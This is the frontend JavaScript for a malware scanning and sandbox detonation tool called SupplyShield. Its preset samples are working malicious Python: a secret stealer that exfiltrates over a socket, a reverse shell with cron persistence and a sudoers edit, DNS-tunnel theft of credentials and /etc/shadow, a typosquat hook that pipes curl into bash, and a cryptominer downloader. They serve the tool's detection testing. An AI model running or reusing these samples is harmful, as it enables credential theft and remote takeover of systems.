/**
 * SupplyShield — Cyber Security Audit & Detonation Engine
 * Interactive Frontend JavaScript Controller
 */

// Configuration Constants
const API_BASE_URL = "http://127.0.0.1:8000";
const WS_BASE_URL = "ws://127.0.0.1:8000/ws/telemetry";

// State
let selectedFile = null;
let ws = null;
let currentTab = "code";

// Preset Code Samples
const PRESETS = {
    safe: `import math

def calculate_circle_area(radius):
    """Computes area of a circle safely using standard math library."""
    if radius < 0:
        raise ValueError("Radius cannot be negative")
    return math.pi * (radius ** 2)

print(f"Area of radius 5: {calculate_circle_area(5)}")`,

    backdoor: `import base64
import zlib

# Obfuscated payload hiding dynamic execution
encoded_payload = "eJxLzs8tKErMS1VISTXUUUjMyc8rKkrNK1EwMjC2MjC10DM00zMBADxICz8="

def execute_stage2():
    # Dynamic decoding and exec invocation
    decoded = base64.b64decode(encoded_payload)
    decompressed = zlib.decompress(decoded).decode('utf-8')
    exec(decompressed)

execute_stage2()`,

    stealer: `import os
import socket
import urllib.request

def harvest_and_exfiltrate():
    # Secret Source Access
    aws_key = os.environ.get("AWS_SECRET_ACCESS_KEY", "AKIAIOSFODNN7EXAMPLE")
    env_data = str(dict(os.environ))

    # Network Sink Exfiltration
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        s.connect(("192.168.1.100", 4444))
        s.send(f"STOLEN_AWS_KEY: {aws_key}".encode())
        s.close()
    except Exception:
        pass

harvest_and_exfiltrate()`,

    reverse_shell: `import os
import subprocess

def setup_persistence():
    cron_cmd = "echo '*/5 * * * * /bin/bash -c \"bash -i >& /dev/tcp/194.26.29.112/9001 0>&1\"' | crontab -"
    os.system(cron_cmd)

def spawn_reverse_shell():
    subprocess.Popen(
        ["/bin/bash", "-c", "bash -i >& /dev/tcp/194.26.29.112/9001 0>&1"],
        stdout=subprocess.PIPE, stderr=subprocess.PIPE
    )

def escalate_privileges():
    os.system("chmod +s /usr/bin/python3")
    os.system("echo 'attacker ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers")

setup_persistence()
spawn_reverse_shell()
escalate_privileges()`,

    dns_exfil: `import os
import socket
import base64

def harvest_environment():
    sensitive_keys = ["AWS_SECRET", "DATABASE_URL", "API_KEY", "TOKEN", "PASSWORD"]
    stolen = {}
    for key, value in os.environ.items():
        for pattern in sensitive_keys:
            if pattern.lower() in key.lower():
                stolen[key] = value
    return stolen

def dns_tunnel_exfil(data, attacker_domain="evil.attacker.com"):
    encoded = base64.b64encode(data.encode()).decode()
    chunks = [encoded[i:i+63] for i in range(0, len(encoded), 63)]
    for chunk in chunks:
        query = f"{chunk}.{attacker_domain}"
        try:
            socket.getaddrinfo(query, None)
        except socket.gaierror:
            pass

def read_cloud_credentials():
    targets = [
        os.path.expanduser("~/.aws/credentials"),
        os.path.expanduser("~/.config/gcloud/credentials.db"),
        "/etc/shadow"
    ]
    collected = ""
    for target in targets:
        try:
            with open(target, "r") as f:
                collected += f.read()
        except Exception:
            pass
    return collected

dns_tunnel_exfil(str(harvest_environment()) + read_cloud_credentials())`,

    typosquat: `# Looks like a normal string utility package...
def capitalize_words(text):
    return " ".join(word.capitalize() for word in text.split())

def reverse_string(text):
    return text[::-1]

# Hidden malicious payload disguised as config loader
def _load_config():
    _cfg = compile("__import__('os').system('curl http://194.26.29.112/shell.sh | bash')", "<config>", "exec")
    exec(_cfg)

class _PostInstallHook:
    def __init__(self):
        try:
            _load_config()
        except Exception:
            pass

_hook = _PostInstallHook()
print(capitalize_words("hello world"))`,

    cryptominer: `import os
import subprocess
import urllib.request

MINER_URL = "http://194.26.29.112/xmrig"

def download_miner():
    tmp_path = os.path.join(os.path.expanduser("~"), ".cache", "systemd-update")
    os.makedirs(os.path.dirname(tmp_path), exist_ok=True)
    try:
        urllib.request.urlretrieve(MINER_URL, tmp_path)
        os.system(f"chmod +x {tmp_path}")
        return tmp_path
    except Exception:
        return None

def start_miner(binary_path):
    subprocess.Popen(
        [binary_path, "--pool", "stratum+tcp://pool.minexmr.com:4444"],
        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
    )

def hide_process():
    os.system("cp /usr/bin/python3 /tmp/.systemd-logind")

miner = download_miner()
if miner:
    start_miner(miner)
    hide_process()`
};

// --- Initialization ---
document.addEventListener("DOMContentLoaded", () => {
    initWebSocket();
    loadPreset("safe");
    checkBackendHealth();
    loadScanHistory();
});

// --- Tab Switching ---
function switchTab(tabName) {
    currentTab = tabName;
    const codeBtn = document.getElementById("tab-code-btn");
    const fileBtn = document.getElementById("tab-file-btn");
    const codeContent = document.getElementById("tab-code");
    const fileContent = document.getElementById("tab-file");

    if (tabName === "code") {
        codeBtn.classList.add("active");
        fileBtn.classList.remove("active");
        codeContent.classList.remove("hidden");
        fileContent.classList.add("hidden");
    } else {
        fileBtn.classList.add("active");
        codeBtn.classList.remove("active");
        fileContent.classList.remove("hidden");
        codeContent.classList.add("hidden");
    }
}

// --- Load Code Preset ---
function loadPreset(type) {
    const textarea = document.getElementById("code-input");
    if (PRESETS[type]) {
        textarea.value = PRESETS[type];
        logTerminal("sys", `Loaded sample preset: [${type.toUpperCase()}]`);
    }
}

// --- File Selection Handlers ---
function triggerFileInput() {
    document.getElementById("file-input").click();
}

function handleFileSelected(event) {
    const file = event.target.files[0];
    if (file) {
        selectedFile = file;
        const info = document.getElementById("file-selected-name");
        info.innerHTML = `<i class="fa-solid fa-file-code"></i> Selected: <strong>${file.name}</strong> (${(file.size / 1024).toFixed(2)} KB)`;
        info.classList.remove("hidden");
        document.getElementById("scan-file-btn").disabled = false;
        logTerminal("sys", `File staged for detonation: ${file.name}`);
    }
}

// Drag & Drop Setup
const dropZone = document.getElementById("drop-zone");
if (dropZone) {
    ['dragenter', 'dragover', 'dragleave', 'drop'].forEach(eventName => {
        dropZone.addEventListener(eventName, preventDefaults, false);
    });

    function preventDefaults(e) { e.preventDefault(); e.stopPropagation(); }

    ['dragenter', 'dragover'].forEach(eventName => {
        dropZone.addEventListener(eventName, () => dropZone.classList.add('dragover'), false);
    });

    ['dragleave', 'drop'].forEach(eventName => {
        dropZone.addEventListener(eventName, () => dropZone.classList.remove('dragover'), false);
    });

    dropZone.addEventListener('drop', (e) => {
        const dt = e.dataTransfer;
        const files = dt.files;
        if (files.length > 0 && files[0].name.endsWith('.py')) {
            document.getElementById('file-input').files = files;
            handleFileSelected({ target: { files: files } });
        }
    });
}

// --- WebSocket Management ---
function initWebSocket() {
    const wsBadge = document.getElementById("ws-status");
    try {
        ws = new WebSocket(WS_BASE_URL);

        ws.onopen = () => {
            wsBadge.style.borderColor = "var(--color-cyan)";
            wsBadge.style.color = "var(--color-cyan)";
            document.querySelector(".ws-status-text").innerText = "WS LIVE";
            logTerminal("sys", "WebSocket telemetry channel established.");
        };

        ws.onmessage = (event) => {
            try {
                const data = JSON.parse(event.data);
                handleIncomingTelemetry(data);
            } catch (err) {
                logTerminal("sys", `WS raw msg: ${event.data}`);
            }
        };

        ws.onclose = () => {
            wsBadge.style.borderColor = "rgba(255, 255, 255, 0.2)";
            wsBadge.style.color = "var(--text-muted)";
            document.querySelector(".ws-status-text").innerText = "WS OFFLINE";
            // Reconnect attempt after 5s
            setTimeout(initWebSocket, 5000);
        };

        ws.onerror = () => {
            document.querySelector(".ws-status-text").innerText = "WS ERROR";
        };

    } catch (e) {
        console.warn("WebSocket init failed:", e);
    }
}

function handleIncomingTelemetry(telemetry) {
    if (telemetry.type === "TELEMETRY") {
        const levelMap = {
            "INFO": "ast-line",
            "WARNING": "sandbox-line",
            "CRITICAL": "threat-line",
            "SUCCESS": "safe-line"
        };
        const cssClass = levelMap[telemetry.level] || "sys-line";
        logTerminal(cssClass, `[${telemetry.stage}] ${telemetry.message}`);
    }
}

// --- Terminal Logging ---
function logTerminal(cssClass, message) {
    const term = document.getElementById("terminal-output");
    const time = new Date().toLocaleTimeString();
    const line = document.createElement("div");
    line.className = `term-line ${cssClass}`;
    line.innerText = `[${time}] ${message}`;
    term.appendChild(line);
    term.scrollTop = term.scrollHeight;
}

function clearTerminal() {
    document.getElementById("terminal-output").innerHTML = "";
    logTerminal("sys", "Terminal cleared.");
}

// --- Check Backend Health ---
async function checkBackendHealth() {
    try {
        const res = await fetch(`${API_BASE_URL}/api/health`);
        if (res.ok) {
            document.getElementById("backend-status").style.borderColor = "var(--color-emerald)";
        }
    } catch (e) {
        document.getElementById("backend-status").style.borderColor = "var(--color-crimson)";
        document.querySelector("#backend-status .status-text").innerText = "OFFLINE";
    }
}

// --- Code Scan Action ---
async function scanCode() {
    const code = document.getElementById("code-input").value;
    if (!code.trim()) {
        alert("Please enter Python code or load a sample preset!");
        return;
    }

    const btn = document.getElementById("scan-code-btn");
    btn.disabled = true;
    btn.innerHTML = `<i class="fa-solid fa-spinner fa-spin"></i> DETONATING & SCANNING...`;

    logTerminal("sys", "Initiating 3-Stage Scan (AST + Sandbox + Risk Scorer)...");

    try {
        const response = await fetch(`${API_BASE_URL}/api/scan/code`, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ code: code, filename: "submitted_snippet.py" })
        });

        const report = await response.json();
        updateThreatDashboard(report);
        loadScanHistory();
    } catch (err) {
        alert("Failed to scan code payload. Make sure backend is running at http://127.0.0.1:8000");
        logTerminal("threat-line", `SCAN ERROR: ${err.message}`);
    } finally {
        btn.disabled = false;
        btn.innerHTML = `<i class="fa-solid fa-radar"></i> DETONATE & SCAN CODE`;
    }
}

// --- File Scan Action ---
async function scanFile() {
    if (!selectedFile) return;

    const btn = document.getElementById("scan-file-btn");
    btn.disabled = true;
    btn.innerHTML = `<i class="fa-solid fa-spinner fa-spin"></i> DETONATING FILE...`;

    const formData = new FormData();
    formData.append("file", selectedFile);

    logTerminal("sys", `Uploading & Detonating Package File: ${selectedFile.name}...`);

    try {
        const response = await fetch(`${API_BASE_URL}/api/scan/package`, {
            method: "POST",
            body: formData
        });

        const report = await response.json();
        updateThreatDashboard(report);
        loadScanHistory();
    } catch (err) {
        alert("Failed to scan package file.");
        logTerminal("threat-line", `FILE SCAN ERROR: ${err.message}`);
    } finally {
        btn.disabled = false;
        btn.innerHTML = `<i class="fa-solid fa-shield-virus"></i> DETONATE & SCAN FILE`;
    }
}

// --- Update UI Dashboard with Report Findings ---
function updateThreatDashboard(report) {
    const riskScore = Math.round(report.composite_risk_score !== undefined ? report.composite_risk_score : (report.risk_score || 0));
    const verdict = report.verdict || "CLEAN";
    const slsaTier = report.slsa_security_level || report.slsa_tier || "SLSA Level 4";
    const recommendedAction = report.recommended_action || report.recommendation || verdict;

    // 1. Update Gauge & Risk Score
    const circle = document.getElementById("gauge-circle");
    const scoreDisplay = document.getElementById("risk-score-display");
    scoreDisplay.innerText = riskScore;

    // Circumference = 2 * PI * 50 = 314
    const offset = 314 - (riskScore / 100) * 314;
    circle.style.strokeDashoffset = offset;

    // Stroke Color based on score
    if (riskScore >= 75) {
        circle.style.stroke = "var(--color-crimson)";
    } else if (riskScore >= 40) {
        circle.style.stroke = "var(--color-amber)";
    } else {
        circle.style.stroke = "var(--color-emerald)";
    }

    // 2. Verdict & Badges
    const badge = document.getElementById("verdict-badge");
    badge.innerText = verdict;
    badge.className = "verdict-badge";
    if (verdict === "CRITICAL_MALICIOUS" || verdict === "BLOCK") {
        badge.classList.add("verdict-malicious");
    } else if (verdict === "SUSPICIOUS") {
        badge.classList.add("verdict-suspicious");
    } else {
        badge.classList.add("verdict-clean");
    }

    document.getElementById("slsa-badge").innerText = slsaTier;
    document.getElementById("ast-time-display").innerText = report.execution_metrics ? `${report.execution_metrics.ast_scan_ms.toFixed(1)} ms` : "<10 ms";
    document.getElementById("sandbox-time-display").innerText = report.execution_metrics ? `${(report.execution_metrics.sandbox_time_ms / 1000).toFixed(2)} s` : "<0.5 s";
    document.getElementById("decision-display").innerText = recommendedAction;

    // Combine static and dynamic findings
    const allFindings = [
        ...(report.static_findings || []),
        ...(report.dynamic_findings || []),
        ...(report.findings || [])
    ];

    // 3. Render Findings Cards
    renderFindings(allFindings);

    logTerminal("safe-line", `SCAN COMPLETE: Risk Score ${riskScore}/100 | Verdict: ${verdict} | Action: ${recommendedAction}`);
}

function renderFindings(findings) {
    const container = document.getElementById("findings-container");
    if (!findings || findings.length === 0) {
        container.innerHTML = `
            <div class="empty-state">
                <i class="fa-solid fa-shield-check" style="color: var(--color-emerald)"></i>
                <p><strong>Zero Threats Detected!</strong> Source code is clean and passes AST static taint & sandbox checks.</p>
            </div>
        `;
        return;
    }

    container.innerHTML = findings.map(f => {
        const severity = f.severity ? f.severity.toLowerCase() : "medium";
        const cardClass = severity === "high" || severity === "critical" ? "finding-card-high" : (severity === "medium" ? "finding-card-medium" : "finding-card-low");
        const mitreCode = f.mitre_id || "T1059";

        return `
            <div class="finding-card ${cardClass}">
                <div class="finding-header">
                    <span class="mitre-tag"><i class="fa-solid fa-shield-virus"></i> ${mitreCode}</span>
                    <span class="severity-tag severity-${severity}">${f.severity || "MEDIUM"}</span>
                </div>
                <div class="finding-desc"><strong>${f.category || "Security Finding"}:</strong> ${f.description}</div>
                ${f.snippet ? `<div class="finding-snippet"><code>${f.snippet}</code></div>` : ""}
            </div>
        `;
    }).join("");
}

// --- Scan History Loader ---
async function loadScanHistory() {
    const tbody = document.getElementById("history-table-body");
    try {
        const res = await fetch(`${API_BASE_URL}/api/history`);
        const history = await res.json();

        if (!history || history.length === 0) {
            tbody.innerHTML = `<tr><td colspan="6" class="text-center text-muted">No scan history recorded in SQLite audit ledger yet.</td></tr>`;
            return;
        }

        tbody.innerHTML = history.map(item => {
            const date = new Date(item.created_at || Date.now()).toLocaleTimeString();
            const verdictClass = item.verdict === "CRITICAL_MALICIOUS" ? "verdict-malicious" : (item.verdict === "SUSPICIOUS" ? "verdict-suspicious" : "verdict-clean");

            return `
                <tr>
                    <td><strong>#${item.id}</strong> <br><small class="text-muted">${date}</small></td>
                    <td><code>${item.target_file || "snippet.py"}</code></td>
                    <td><strong>${Math.round(item.risk_score)}</strong>/100</td>
                    <td><span class="verdict-badge ${verdictClass}" style="font-size: 11px; padding: 2px 8px;">${item.verdict}</span></td>
                    <td><span class="slsa-badge">${item.slsa_tier || "SLSA Level 4"}</span></td>
                    <td>
                        <button class="btn-secondary" style="padding: 4px 10px; font-size: 11px;" onclick="viewScanDetails(${item.id})">
                            <i class="fa-solid fa-eye"></i> View Report
                        </button>
                    </td>
                </tr>
            `;
        }).join("");
    } catch (e) {
        console.warn("Failed to load history:", e);
    }
}

// --- View Detailed Report Modal ---
async function viewScanDetails(id) {
    try {
        const res = await fetch(`${API_BASE_URL}/api/scan/${id}`);
        const data = await res.json();

        const content = document.getElementById("modal-report-content");
        content.innerHTML = `
            <div style="font-family: var(--font-mono); line-height: 1.6;">
                <p><strong>Scan Audit ID:</strong> #${data.id}</p>
                <p><strong>Target Package:</strong> <code>${data.target_file}</code></p>
                <p><strong>Timestamp:</strong> ${data.created_at}</p>
                <p><strong>Risk Score:</strong> <span style="font-size: 18px; font-weight: 800;">${data.risk_score}/100</span></p>
                <p><strong>Verdict:</strong> ${data.verdict}</p>
                <hr style="border-color: var(--border-glass); margin: 14px 0;">
                <h5>Findings Breakdown (${data.findings ? data.findings.length : 0}):</h5>
                <pre style="background: #050810; padding: 14px; border-radius: 8px; font-size: 11px; color: var(--color-cyan); overflow-x: auto;">${JSON.stringify(data.findings, null, 2)}</pre>
            </div>
        `;
        document.getElementById("report-modal").classList.remove("hidden");
    } catch (e) {
        alert("Could not fetch scan report details.");
    }
}

function closeModal() {
    document.getElementById("report-modal").classList.add("hidden");
}
